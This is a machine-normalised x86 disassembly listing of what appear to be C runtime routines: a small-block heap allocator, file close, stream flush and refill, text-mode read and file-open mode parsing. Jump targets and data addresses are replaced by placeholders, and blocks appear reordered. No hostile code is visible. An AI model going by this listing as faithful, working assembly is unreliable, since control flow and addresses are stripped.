jge r-xdata
test bl 0x1
jne r-xdata
push 0x1
pop eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
mov [ ebp + 0xc ] ebx
sar esi 0x4
dec esi
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
cmp ecx 0x3f
mov [ ebp - 0x8 ] ecx
jbe r-xdata
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] ecx
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
cmp ecx 0x20
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov ecx [ edi + 0x4 ]
mov esi [ edi + 0x8 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
cmp esi 0x20
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe r-xdata
add ecx 0xffffffe0
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov edx 0x80000000
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov edx 0x80000000
mov ecx esi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
cmp edi 0x20
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
mov edx 0x80000000
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov edx 0x80000000
mov ecx edi
jmp r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
shr edx cl
or [ eax ] edx
sub_407977
cmp [ rw-data ] 0xffffffff
push ebx
push ebp
push esi
push edi
jne r-xdata
push 0x2020
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
je r-xdata
mov esi rw-data
jmp r-xdata
xor eax eax
mov ebp [ VirtualAlloc@IAT ]
push 0x4
push 0x2000
push __dos_header
push 0x0
call ebp
mov edi eax
test edi edi
je r-xdata
cmp esi rw-data
je r-xdata
push 0x4
mov ebx 0x10000
push 0x1000
push ebx
push edi
call ebp
test eax eax
je r-xdata
push esi
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
push 0x8000
push 0x0
push edi
call [ VirtualFree@IAT ]
mov eax rw-data
cmp esi eax
jne r-xdata
mov [ esi ] eax
mov eax [ rw-data ]
mov [ esi + 0x4 ] eax
mov [ rw-data ] esi
mov eax [ esi + 0x4 ]
mov [ eax ] esi
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
cmp ebp 0x10
setge dl
dec edx
and edx ecx
dec edx
inc ebp
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
add eax 0x8
cmp ebp 0x400
jl r-xdata
push ebx
push 0x0
push edi
call sub_4043c0
add esp 0xc
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] eax
mov eax esi
jmp r-xdata
or [ edi + 0xf8 ] 0xff
lea eax [ edi + 0x8 ]
mov [ edi ] eax
mov [ edi + 0x4 ] 0xf0
add edi 0x1000
jmp r-xdata
lea eax [ edi + __dos_header ]
lea ecx [ esi + 0x98 ]
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x18 ]
mov [ esi + 0xc ] ecx
mov [ esi + 0x10 ] edi
mov [ esi + 0x8 ] eax
xor ebp ebp
mov ecx 0xf1
mov [ rw-data ] eax
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ esi + 0x10 ]
add eax ebx
cmp edi eax
jae r-xdata
sub_407abb
push esi
mov esi [ esp + 0x8 ]
push 0x8000
push 0x0
push [ esi + 0x10 ]
call [ VirtualFree@IAT ]
cmp [ rw-data ] esi
jne r-xdata
cmp esi rw-data
je r-xdata
mov eax [ esi + 0x4 ]
mov [ rw-data ] eax
or [ rw-data ] 0xffffffff
pop esi
retn
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
push esi
push 0x0
mov [ eax ] ecx
mov eax [ esi ]
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
push [ rw-data ]
call [ HeapFree@IAT ]
pop esi
retn
sub_407b11
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ rw-data ]
push edi
cmp esi [ rw-data ]
je r-xdata
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0x2010 ]
mov ebx 0x3ff000
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
sub ebx 0x1000
sub edi 0x8
test ebx ebx
jge r-xdata
mov eax ebx
push 0x4000
add eax [ esi + 0x10 ]
push 0x1000
push eax
call [ VirtualFree@IAT ]
test eax eax
je r-xdata
cmp [ esi + 0x10 ] 0xffffffff
je r-xdata
cmp [ edi ] 0xf0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
mov ecx esi
mov esi [ esi + 0x4 ]
je r-xdata
or [ edi ] 0xffffffff
dec [ rw-data ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ecx + 0x18 ] 0xffffffff
jne r-xdata
mov [ esi + 0xc ] edi
cmp eax edi
jbe r-xdata
push 0x1
lea eax [ ecx + 0x20 ]
pop edx
inc [ ebp - 0x4 ]
dec [ ebp + 0x8 ]
je r-xdata
cmp edx 0x400
jne r-xdata
inc edx
add eax 0x8
cmp edx 0x400
jl r-xdata
push ecx
call sub_407abb
pop ecx
cmp [ eax ] 0xffffffff
jne r-xdata
sub_407bd3
mov eax [ esp + 0x4 ]
mov edx rw-data
push esi
mov ecx edx
mov ecx [ ecx ]
cmp ecx edx
je r-xdata
cmp eax [ ecx + 0x14 ]
jb r-xdata
xor eax eax
pop esi
retn
jmp r-xdata
test al 0xf
jne r-xdata
cmp eax [ ecx + 0x10 ]
jbe r-xdata
mov esi eax
mov edx 0x100
and esi 0xfff
cmp esi edx
jb r-xdata
mov esi [ esp + 0xc ]
mov [ esi ] ecx
mov esi [ esp + 0x10 ]
mov ecx eax
and cx 0xf000
sub eax ecx
mov [ esi ] ecx
sub eax edx
pop esi
sar eax 0x4
lea eax [ eax + ecx + 0x8 ]
retn
sub_407c2a
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
sub ecx [ eax + 0x10 ]
sar ecx 0xc
lea eax [ eax + ecx * 8 + 0x18 ]
mov ecx [ esp + 0xc ]
movzx edx [ ecx ]
add [ eax ] edx
and [ ecx ] 0x0
cmp [ eax ] 0xf0
mov [ eax + 0x4 ] 0xf1
jne r-xdata
retn
inc [ rw-data ]
cmp [ rw-data ] 0x20
jne r-xdata
push 0x10
call sub_407b11
pop ecx
sub_407c6f
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ rw-data ]
push edi
mov ebx [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
lea ecx [ esi + 0x2018 ]
mov eax edi
sub eax esi
sub eax 0x18
sar eax 0x3
shl eax 0xc
add eax edx
cmp edi ecx
mov [ ebp - 0x4 ] eax
jae r-xdata
mov eax rw-data
mov edi eax
jmp r-xdata
mov ebx [ ebp + 0x8 ]
mov ecx [ edi ]
mov ebx [ ebp + 0x8 ]
cmp ecx ebx
jl r-xdata
mov edi [ edi ]
cmp edi eax
je r-xdata
cmp [ edi + 0xc ] 0x0
jne r-xdata
mov edx [ esi + 0x10 ]
cmp edx 0xffffffff
je r-xdata
mov esi [ esi ]
cmp esi [ rw-data ]
je r-xdata
mov eax [ edi ]
cmp eax ebx
jl r-xdata
add edi 0x8
lea ecx [ esi + 0x2018 ]
add eax 0x1000
cmp edi ecx
mov [ ebp - 0x4 ] eax
jb r-xdata
cmp [ edi + 0x4 ] ebx
jbe r-xdata
call sub_407977
test eax eax
je r-xdata
jmp r-xdata
mov ebx [ edi + 0xc ]
and [ ebp - 0x4 ] 0x0
mov esi ebx
mov eax ebx
sub esi edi
sub esi 0x18
sar esi 0x3
shl esi 0xc
add esi [ edi + 0x10 ]
cmp [ ebx ] 0xffffffff
jne r-xdata
add [ ebp - 0x4 ] 0x1000
add edi 0x8
cmp edi [ ebp - 0x8 ]
jb r-xdata
cmp [ edi + 0x4 ] ebx
jbe r-xdata
jmp r-xdata
push ebx
push ecx
push eax
call sub_407e77
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
mov ecx [ eax + 0x10 ]
mov [ ecx + 0x8 ] bl
lea edx [ ecx + ebx + 0x8 ]
mov [ rw-data ] eax
mov [ ecx ] edx
mov edx 0xf0
sub edx ebx
mov [ ecx + 0x4 ] edx
movzx edx bl
sub [ eax + 0x18 ] edx
lea eax [ ecx + 0x100 ]
jmp r-xdata
cmp [ edi + 0x10 ] 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
push 0x4
shl eax 0xc
push 0x1000
push eax
push esi
mov [ ebp - 0x8 ] eax
call [ VirtualAlloc@IAT ]
cmp eax esi
jne r-xdata
cmp [ ebp - 0x4 ] 0x10
jge r-xdata
jmp r-xdata
push ebx
push eax
push [ ebp - 0x4 ]
call sub_407e77
add esp 0xc
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x10 ]
lea edi [ esi + 0x18 ]
mov [ ebp - 0x8 ] eax
cmp edi eax
mov [ ebp - 0x4 ] ecx
jae r-xdata
mov [ rw-data ] esi
sub [ edi ] ebx
mov [ esi + 0x8 ] edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ edi + 0x4 ] ebx
pop edi
pop esi
pop ebx
leave
retn
push 0x0
push [ ebp - 0x8 ]
push esi
call sub_4043c0
mov edx [ ebp - 0x4 ]
add esp 0xc
test edx edx
mov ecx ebx
jle r-xdata
add eax 0x8
inc [ ebp - 0x4 ]
cmp [ eax ] 0xffffffff
je r-xdata
mov [ edi + 0x4 ] ebx
mov [ rw-data ] edi
lea eax [ edi + 0x2018 ]
lea eax [ esi + 0x4 ]
mov [ ebp - 0x4 ] edx
sbb eax eax
and eax ecx
mov [ edi + 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x8 ] al
mov [ edi + 0x8 ] ebx
sub [ ebx ] eax
sub [ esi + 0x4 ] eax
lea ecx [ esi + eax + 0x8 ]
lea eax [ esi + 0x100 ]
mov [ esi ] ecx
jmp r-xdata
cmp [ ecx ] 0xffffffff
je r-xdata
or [ eax + 0xf4 ] 0xff
lea edx [ eax + 0x4 ]
mov [ eax - 0x4 ] edx
mov edx 0xf0
mov [ eax ] edx
mov [ ecx ] edx
mov [ ecx + 0x4 ] 0xf1
add eax 0x1000
add ecx 0x8
dec [ ebp - 0x4 ]
jne r-xdata
cmp ecx eax
add ecx 0x8
jmp r-xdata
cmp ecx eax
jae r-xdata
sub_407e77
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ecx + 0x4 ]
push edi
mov edi [ ecx ]
lea ebx [ ecx + 0xf8 ]
cmp esi edx
mov [ ebp - 0x4 ] edi
mov eax edi
mov [ ebp + 0x8 ] ebx
jb r-xdata
add esi edi
cmp [ esi ] 0x0
je r-xdata
lea eax [ edi + edx ]
mov [ edi ] dl
cmp eax ebx
jae r-xdata
lea esi [ eax + edx ]
cmp esi ebx
jae r-xdata
mov eax esi
and [ ecx + 0x4 ] 0x0
lea eax [ ecx + 0x8 ]
mov [ ecx ] eax
add [ ecx ] edx
sub [ ecx + 0x4 ] edx
jmp r-xdata
lea esi [ ecx + 0x8 ]
mov bl [ eax ]
test bl bl
jne r-xdata
imul ecx ecx 0xf
shl eax 0x4
sub eax ecx
jmp r-xdata
lea eax [ edi + 0x8 ]
jmp r-xdata
xor eax eax
lea eax [ esi + edx ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
movzx esi bl
add eax esi
push 0x1
lea ebx [ eax + 0x1 ]
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov al [ esi ]
test al al
jne r-xdata
cmp esi edx
jae r-xdata
inc ebx
inc esi
jmp r-xdata
movzx eax al
add esi eax
jmp r-xdata
push 0x1
lea ebx [ esi + 0x1 ]
pop eax
lea ebx [ eax + edx ]
cmp ebx [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x4 ]
jne r-xdata
cmp [ ebx ] 0x0
jne r-xdata
cmp esi edi
jae r-xdata
cmp eax edx
jae r-xdata
inc ebx
inc eax
jmp r-xdata
and [ ecx + 0x4 ] 0x0
lea esi [ ecx + 0x8 ]
mov [ ecx ] esi
sub esi edx
mov [ ecx ] ebx
mov [ ecx + 0x4 ] esi
jmp r-xdata
sub [ ebp + 0xc ] esi
cmp [ ebp + 0xc ] edx
jb r-xdata
mov [ ecx + 0x4 ] esi
jmp r-xdata
lea ebx [ esi + edx ]
cmp ebx [ ebp + 0x8 ]
jae r-xdata
sub [ ebp + 0xc ] eax
cmp [ ebp + 0xc ] edx
jb r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov [ eax ] dl
add eax 0x8
jmp r-xdata
mov edi [ ebp - 0x4 ]
mov eax ebx
jmp r-xdata
and [ ecx + 0x4 ] 0x0
lea eax [ ecx + 0x8 ]
mov [ ecx ] eax
sub eax edx
mov [ ecx ] ebx
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov esi ebx
jmp r-xdata
lea esi [ eax + edx ]
cmp esi [ ebp + 0x8 ]
jb r-xdata
mov [ esi ] dl
lea eax [ esi + 0x8 ]
sub_407f9b
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
movzx ecx [ edx ]
push edi
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax ebx
sub eax [ edi + 0x10 ]
sar eax 0xc
cmp ecx [ ebp + 0x14 ]
lea edi [ edi + eax * 8 + 0x18 ]
jbe r-xdata
jae r-xdata
mov eax [ ebp + 0x14 ]
sub ecx eax
mov [ edx ] al
add [ edi ] ecx
mov [ edi + 0x4 ] 0xf1
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x14 ]
lea esi [ edx + eax ]
lea eax [ ebx + 0xf8 ]
cmp esi eax
ja r-xdata
mov [ ebp - 0x4 ] 0x1
lea eax [ ecx + edx ]
jne r-xdata
cmp [ eax ] 0x0
jne r-xdata
mov al [ ebp + 0x14 ]
mov [ edx ] al
mov eax [ ebx ]
cmp edx eax
ja r-xdata
cmp eax esi
inc eax
jmp r-xdata
sub ecx [ ebp + 0x14 ]
add [ edi ] ecx
cmp esi eax
jbe r-xdata
cmp eax esi
jae r-xdata
lea eax [ ebx + 0xf8 ]
cmp esi eax
jae r-xdata
and [ ebx + 0x4 ] 0x0
lea eax [ ebx + 0x8 ]
mov [ ebx ] eax
xor eax eax
mov [ ebx ] esi
cmp [ esi ] al
jne r-xdata
mov [ ebx + 0x4 ] eax
jmp r-xdata
inc eax
cmp [ esi + eax ] 0x0
je r-xdata
sub_408044
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
cmp edi [ rw-data ]
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
mov eax edi
mov esi edi
sar eax 0x5
and esi 0x1f
lea ebx [ eax * 4 + rw-data ]
shl esi 0x3
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
push edi
call sub_40b5ec
cmp eax 0xffffffff
pop ecx
je r-xdata
xor ebp ebp
cmp edi 0x1
je r-xdata
xor eax eax
jmp r-xdata
push ebp
call sub_40b3ff
pop ecx
jmp r-xdata
push 0x2
call sub_40b5ec
push 0x1
mov ebp eax
call sub_40b5ec
pop ecx
cmp eax ebp
pop ecx
je r-xdata
cmp edi 0x2
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
or eax 0xffffffff
push edi
call sub_40b5ec
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov ebp eax
jmp r-xdata
push edi
call sub_40b572
mov eax [ ebx ]
pop ecx
and [ eax + esi + 0x4 ] 0x0
test ebp ebp
je r-xdata
sub_4080f7
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_405bdc
and [ esi + 0xc ] 0xfbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_408122
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_40815d
test eax eax
pop ecx
je r-xdata
push esi
call sub_4081c2
pop ecx
pop esi
retn
test [ esi + 0xd ] 0x40
je r-xdata
or eax 0xffffffff
pop esi
retn
xor eax eax
pop esi
retn
push [ esi + 0x10 ]
call sub_40b629
neg eax
pop ecx
pop esi
sbb eax eax
retn
sub_40815d
push ebx
push esi
mov esi [ esp + 0xc ]
xor ebx ebx
push edi
mov eax [ esi + 0xc ]
mov ecx eax
and ecx 0x3
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop edi
mov eax ebx
pop esi
pop ebx
retn
test ax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
push edi
push eax
push [ esi + 0x10 ]
call sub_409185
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al 0x80
je r-xdata
and al 0xfd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_4081c2
push ebx
push esi
push edi
xor esi esi
xor ebx ebx
xor edi edi
cmp [ rw-data ] esi
jle r-xdata
cmp [ esp + 0x10 ] 0x1
mov eax ebx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
inc esi
cmp esi [ rw-data ]
jl r-xdata
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
cmp [ esp + 0x10 ] 0x1
jne r-xdata
cmp [ esp + 0x10 ] 0x0
jne r-xdata
push eax
call sub_408122
cmp eax 0xffffffff
pop ecx
je r-xdata
test cl 0x2
je r-xdata
inc ebx
jmp r-xdata
push eax
call sub_408122
cmp eax 0xffffffff
pop ecx
jne r-xdata
or edi eax
sub_40822f
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
or eax 0xffffffff
pop esi
retn
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or al 0x1
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
or al 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_40ac3e
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
and [ esi + 0x4 ] 0x0
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push [ esi + 0x10 ]
call sub_408308
add esp 0xc
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0xc ]
test dl 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
mov ecx [ esi + 0x10 ]
push edi
cmp ecx 0xffffffff
je r-xdata
mov ecx [ esi ]
dec eax
mov [ esi + 0x4 ] eax
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
pop esi
retn
mov ecx [ esi + 0xc ]
test cl 0x8
je r-xdata
mov edi rw-data
mov edi ecx
sar edi 0x5
and ecx 0x1f
mov edi [ edi * 4 + rw-data ]
lea edi [ edi + ecx * 8 ]
jmp r-xdata
test ch 0x4
jne r-xdata
or dh 0x20
mov [ esi + 0xc ] edx
mov cl [ edi + 0x4 ]
pop edi
and cl 0x82
cmp cl 0x82
jne r-xdata
mov [ esi + 0x18 ] 0x1000
sub_408308
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
cmp esi [ rw-data ]
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
mov eax esi
and esi 0x1f
sar eax 0x5
shl esi 0x3
lea ebx [ eax * 4 + rw-data ]
mov eax [ eax * 4 + rw-data ]
add eax esi
mov dl [ eax + 0x4 ]
test dl 0x1
je r-xdata
and [ ebp - 0x8 ] 0x0
mov edi [ ebp + 0xc ]
cmp [ ebp + 0x10 ] 0x0
mov ecx edi
je r-xdata
xor eax eax
jmp r-xdata
test dl 0x2
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
test dl 0x48
je r-xdata
lea eax [ ebp - 0xc ]
push 0x0
push eax
mov eax [ ebx ]
push [ ebp + 0x10 ]
push ecx
push [ eax + esi ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov al [ eax + 0x5 ]
cmp al 0xa
je r-xdata
mov eax [ ebx ]
mov edx [ ebp - 0xc ]
add [ ebp - 0x8 ] edx
lea ecx [ eax + esi + 0x4 ]
mov al [ eax + esi + 0x4 ]
test al 0x80
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop ecx
cmp eax ecx
jne r-xdata
dec [ ebp + 0x10 ]
mov [ edi ] al
mov eax [ ebx ]
lea ecx [ edi + 0x1 ]
mov [ ebp - 0x8 ] 0x1
mov [ eax + esi + 0x5 ] 0xa
mov eax [ ebp - 0x8 ]
jmp r-xdata
test edx edx
je r-xdata
cmp eax 0x6d
jne r-xdata
mov [ rw-data ] 0x9
mov [ rw-data ] ecx
jmp r-xdata
and al 0xfb
cmp [ edi ] 0xa
jne r-xdata
push eax
call sub_40b3ff
pop ecx
jmp r-xdata
or eax 0xffffffff
sub edi [ ebp + 0xc ]
mov [ ebp - 0x8 ] edi
mov eax [ ebp + 0x10 ]
mov al [ eax ]
cmp al 0x1a
je r-xdata
or al 0x4
jmp r-xdata
mov eax [ ebx ]
lea esi [ eax + esi + 0x4 ]
mov al [ esi ]
test al 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov [ ecx ] al
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
add ecx eax
cmp eax ecx
mov [ ebp - 0x8 ] ecx
jae r-xdata
or al 0x2
mov [ esi ] al
dec ecx
cmp [ ebp + 0x10 ] ecx
jae r-xdata
mov [ edi ] al
inc edi
inc [ ebp + 0x10 ]
jmp r-xdata
lea eax [ ebp - 0xc ]
push 0x0
push eax
inc [ ebp + 0x10 ]
lea eax [ ebp - 0x1 ]
push 0x1
push eax
mov eax [ ebx ]
push [ eax + esi ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x10 ]
inc eax
cmp [ eax ] 0xa
jne r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ebp + 0x10 ] ecx
jb r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ edi ] 0xd
inc edi
mov [ ebp + 0x10 ] eax
jmp r-xdata
add [ ebp + 0x10 ] 0x2
jmp r-xdata
jmp r-xdata
mov [ edi ] 0xd
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x48
je r-xdata
mov [ edi ] 0xa
jmp r-xdata
cmp edi [ ebp + 0xc ]
jne r-xdata
mov al [ ebp - 0x1 ]
cmp al 0xa
je r-xdata
inc edi
push 0x1
push 0xffffffff
push [ ebp + 0x8 ]
call sub_40aba4
add esp 0xc
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
jne r-xdata
mov [ edi ] 0xd
mov ecx [ ebx ]
inc edi
mov [ ecx + esi + 0x5 ] al
jmp r-xdata
sub_4084fe
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ rw-data ]
push edi
mov edi [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
mov al [ edi ]
cmp al 0x61
je r-xdata
mov ecx 0x109
cmp al 0x72
je r-xdata
push 0x1a4
push [ ebp + 0x10 ]
push ecx
push [ ebp + 0x8 ]
call sub_40b680
mov ecx eax
add esp 0x10
cmp ecx ebx
jge r-xdata
cmp edx ebx
je r-xdata
xor ecx ecx
or esi 0x1
jmp r-xdata
cmp al 0x77
jne r-xdata
mov eax [ ebp + 0x14 ]
inc [ rw-data ]
mov [ eax + 0xc ] esi
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x1c ] ebx
mov [ eax + 0x10 ] ecx
xor eax eax
jmp r-xdata
movsx eax al
cmp eax 0x54
jg r-xdata
push 0x1
pop edx
mov ecx 0x301
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub eax 0x62
je r-xdata
je r-xdata
or esi 0x2
test ch 0xc0
je r-xdata
dec eax
je r-xdata
mov eax 0x1000
test eax ecx
jne r-xdata
